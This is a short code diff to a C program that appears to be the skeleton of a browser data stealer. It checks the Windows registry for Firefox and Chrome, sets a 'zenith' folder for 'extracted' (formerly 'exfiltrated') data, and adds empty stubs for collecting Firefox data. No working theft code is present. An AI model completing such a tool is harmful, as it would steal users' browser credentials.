@@ -5,15 +5,17 @@
 
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
-#define PATH_TO_EXFILTRATED_DATA "Documents"
+#define PATH_TO_EXTRACTED_DATA "Documents\\zenith"
 
 bool verify_browser_installation(const LPCWSTR p_name);
+void create_extraction_directory();
+void collect_firefox_data();
 
 int main(int argc, char** argv) {
 	// Firefox
 	if (verify_browser_installation(L"Software\\Mozilla\\Firefox"))
 	{
-		
+		collect_firefox_data();
 	}
 
 	// Chrome
@@ -80,4 +82,12 @@ bool verify_browser_installation(const LPCWSTR p_name) {
 		return true;
 	}
 	return false;
+}
+
+void create_extraction_directory() {
+
+}
+
+void collect_firefox_data() {
+	
 }
